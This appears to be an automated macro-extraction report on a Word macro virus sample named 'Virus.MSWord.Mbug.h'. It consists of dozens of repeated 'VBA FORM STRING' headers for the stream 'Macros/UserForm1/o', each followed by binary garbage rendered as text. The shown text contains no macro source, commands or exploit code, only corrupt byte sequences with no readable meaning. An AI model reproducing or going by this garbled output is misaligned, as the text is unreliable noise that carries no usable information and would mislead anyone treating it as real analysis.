=BMkPZmLY�PZm3=T3=T1-X'1YBMk������}�����ӻ̌��ai~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1-X1)B99JB9BB9BB9BB9BB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGRBBZKURBBZKUJBBJBBJBBJBBJBBB9JB/V'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B199B9BJBBJBBRBJOGGZKURBBZKUJBBOGGZKUOGGRBJQII���xpt{^ceYVJBB<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)=-19)9B9BJBBJBBOGGJBB9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_����ӻ̦�����sx�sx�ai~���ӻ�ӻ�kk9Fc99J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3=TB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.D19c999$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X19J19cBMkBMk9Fc1-X'1Y19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1-XPZm]i�fs�BMkBBR3=TBMkLY����������������LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1-X1)B9)9B9BB9BB9BB9BB9BJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGZKUZKUOGGRBBOGGZKURBBJBBJBBJBBBBRB/V1)B1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B999B9BJ9BJBBOGGOGGZKUZKUR9BZKUOGGOGGNPTZKULDD���xptk^gkVcJBB=-13#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1!!=-1JBBRBJOGGZKUeYV^RcOGGB9B3#)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�������������������~�ƫ����������{�BBR)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X1)B99J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=19c]i�}��RcsPZmLY�fs����~����ʦ�����19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N'1Y'&D99JB9BB9BB9BB9BB9BJBBJBBJBBOGGOGGOGGOGGOGGZKUOGGOGGOGGOGGZKURBBJBBJBBJBBOGGOGG99J>FX1-X##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=999B9BB9BJBBJBBRBJZKUZKUZKUZKURBJOGGOGGNPTQII���l`i^RcOGGB9B3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B9BJBBeYVk^gsZckVcsZceYVRBJ9)9))!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9������ӻ�ܴ����fs�������}�����sx�ccc'1Y1)B19J19cB9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D'&D$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-XBMk]i�fs�JJZBMk]i����������������LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J1)BB9BB9BJBBJBBJBBJBBJBBOGGRBJZKURBBZKUJBBOGGOGGOGGZKURBBZKUOGGOGGOGGJBBJBJBBR99J19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%91)B9)9B9BB9BJBBJBBRBJRBJJJROGGZKURBBZKUOGGJJRTDL���lXeeYVJBB<.<3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)B9BZKUkVck^gskc{qik^gsemZKUJ99=-1)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XFm���ӻ�������sx�t_����ai~JJZPZmPZm19J1)B99J3=T19c1)B)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y9Fc19c9Fc9FcPZm}r�������LY�BMkai~ai~}�������ǁ��ai~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)BB9BB9BB9BB9BJBBJBBJBBJBBJBJOGGZKUOGGRBJRBBOGGRBJZKUZKURBJZKUOGGOGGOGGOGGOGGBBRBBR99J3=T1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B999999B9BJBBJBBOGGOGGRBJZKURBJZKUZKURBBZKUTDL���g[XJ9J9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)9)9NPTkVcsem�o|�o|�o|skckVcJBBB9B=-1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������ӻ̮��sx�PZmiiqRcs#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=9Fciiq?9W1)B19J99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.D')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!99J..9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)BLY�19B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!919c]i�]i�ai~]i�LY�}����Ǯ��ai~9Fcai~sx�dt�fs����fs�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N##X1)B99JB9BJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUZKUJBBZKURBJJJROGGRJJOGGJBBOGGOGGBBRBBRB/V3.D1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B1999)9B9BJBBJBBJBBOGGOGGOGGOGGNPTZKUZKUOGGLLT���LDDJBB3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)JBBZKUkVc{qi�o|�wwosskcsemZKUJ993#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B=kƫ���ˮ��}��t_�sx�kkJBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N9FcJJRBBRJJZ99J)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2>FX99J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91-XPZm3=T#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-Xfs�fs�5:kPZm]i�}��������ai~9FcLY����������}��19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N1-X)%93.DB9BJBBJBBJBBJBBJBJRJJOGGOGGOGGZKUJBBZKURBBZKUZKURBJZKUJBBOGGOGGRBBJBBJBBJBJ99J3=T1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B999999B9BJBBJBBJBBJBBOGGOGGZKURBBZKUJJRRBJQII���;;;3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)J99ZKUkVcskc�o|k^g�mnkVcZKUZKU<.<3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�~�ӻ̮��������������3=T1)B'1Y'1YBBR19J99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
299J')-)%9[ZlBBR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B19J1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=9FcJJZPZm19c19JLY�ai~BFF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1-XBMkfs����]i�ai~ai~���������}��##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N1)BB9BJBBJBBJBBJBBJBBRBBJJROGGZKURBBZKUOGGJJRRBJNPTZKUZKURBBZKUJBBOGGRBB<<?JBB<<?BBRB/V1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B999999B9BBB9JBBJBBJBBJBBOGGOGGOGGZKUOGGZKUQII���#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)B9BRBBZKUsZcskck^gskckVcOGGJ993#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B���������sx�������sx�iiq3=T'&D1-X1-X1)B99J1)B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=kkt_�'&D3=T>FX1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%9B=kai~3=T'1Yiiq���JJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=19cLHkiiqPZma[~dt����ƫͮ��5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1)B1)B99JB9BJBBJBBJBBJBBJBJRBBRJJZKUR9BOGGZKUOGGOGGOGGZKUZKUJBBOGGOGGJBBRBBRBBJBBJBB?9WB/V1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B<.<9)9<.<999JBBJBBJBBJBBOGGOGGZKUOGGOGGZKUQII���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9B9BRBBOGGZKUkVcZKUZKURBB<.<3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)iiqƫ���Ɂ��������sx�ai~3=T>FXJJZ9Fc9Fc1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)BBBRBMkiiq>FX?9W3=TBBR)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B19J19c]i����BBR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B19JPZmsx�PZmai~}r�������LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99JB9BJBBJBBJBBJBBRBBJBJRJJRJJZKURBJOGGOGGOGGZKURBJJBBZKUOGGJBBOGGZKUJBBJBBJJR?9W1)B1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=<.<9999)9F-=B9BJBBJBBOGGOGGZKURBJOGGOGGOGGQII���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)9)9B9BJBBJBBOGGOGG<.<3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!J9R���ӻ̕��������ai~PZmJJRPZmPZm3=T>FX19c199#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=>FX>FXJJZJJRPZmPZmJJZ19J1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B99JLY�]i�BBR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J19J19cPZm}r����}r�sx����ai~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99J999JBJJBBJBBJBBJBJRBBRJJJJRRJJOGGRBJZKURBJJJRZKUZKUJBBOGGOGGOGGJBBJBBJBBJBJ99J99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B999999BB9=-1B9BJBBJBBJBBOGGOGGOGGRJJRBJOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)3#)<.<F-==-13#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9�~����sx�������fs�PZmPZmBMkiiqfs�a[~LY�PZm9Fc19J3=T'1Y3=TRcsai~PZmPZm>FX3=T>FXa[~[[��o�fs�NPT#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=PZm}��fs�3=T3=T1-X3=TPZmsx����������kka[~!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X99JB9BJBBJBBJBBJBBOGGRBBRJJOGGRJJRBJOGGZKUJBBZKURBJZKUZKUOGGOGGJBBJBBJBBJBBJBBJBBB9J99J1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=9999)99999)9J9BB9BJBBJBBJBBOGGOGGOGGZKUOGG\MW���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)cRk������������{�kkkkai~ai~���������}��}��~��������sx�fs�sx�Rcs3=T>FX9Fc>FXJJZai~fs�������3=T!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J19J5:k]i�}��~��ai~dt�}��]i�dt��~����fs�Rcs9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JB9BJBBJBBJBBOGGJJROGGRJJOGGRJJOGGNPTZKURBBZKURBJJJRJJRZKUOGGJBBJBBJBBJBBB9BB9B99J1)B'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)%91)B999999F-=999B9BB9BB9BJBBJBBOGGOGGOGGOGGOGGPRV���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)199cZk����~�sx�{�kkkkfs�{����������������ƫ���ް�ʕ��}��}��]i�PZmPZm[Zl]i�sx�ai~]i�}��fs�BMk19cLY�kkt_�}r�}��}�����������ƫͰ�ʌ��'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBJBBJBBOGGJBBOGGOGGOGGOGGOGGOGGRBJOGGNPTZKUJBBRBJOGGZKUJBBOGGJBBJBBJBBJBBB9J99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B9)99999999)9F-=999JBBJBBJBBJBBOGGOGGZKUOGGPRV���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3.+JBJ[Zl���~�fs���iiqkksx�}��������������ӻ����ӻ̦�����}��}��fs�]i�}��������}��}r�}��fs�Rcsfs����xw�}����������Ǧ�����������}r�19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBJBBJBBJBBOGGJJROGGRJJNPTRBJOGGRBJOGGOGGZKUZKURBJOGGOGGOGGJBBJBBJBBJBBB9BB9B99J1)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%99)9999999999F-=999B9BB9BJBBB9BJBBJBBOGGOGGOGG\MW���


-------------------------------------------------------------------------------
